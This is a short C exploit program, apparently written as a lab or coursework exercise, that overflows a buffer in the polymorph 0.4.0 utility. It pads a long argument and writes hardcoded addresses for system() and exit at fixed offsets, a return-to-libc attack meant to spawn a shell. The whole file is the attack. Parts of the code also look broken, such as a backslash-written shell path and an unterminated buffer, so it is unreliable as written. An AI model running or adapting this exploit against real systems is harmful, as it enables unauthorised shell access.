// Miguel Sotolongo
// Exploit buffer overflow bug in polymorph
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>

#define C_MAX 	4136
#define R_MAX	31

int main() {
	char command[R_MAX] =  "./polymorph-0.4.0/polymorph -f ";
	char arg[C_MAX];
	char full[R_MAX+C_MAX];
	int i;

	for(i = 0; i < C_MAX; i++) {
		arg[i] = 0x61;
	}

	putenv("SHACK=\\bin\\sh");
	

	* (uint32_t *) &arg[4124] = 0x080487d0; // system
	* (uint32_t *) &arg[4128] = 0x080487f0; // clean exit
	* (uint32_t *) &arg[4132] = getenv("SHACK"); // bin-sh
	
	memcpy(&full[0], command, R_MAX);
	memcpy(&full[R_MAX], arg, C_MAX);

	system(full);
	return 0; 
}
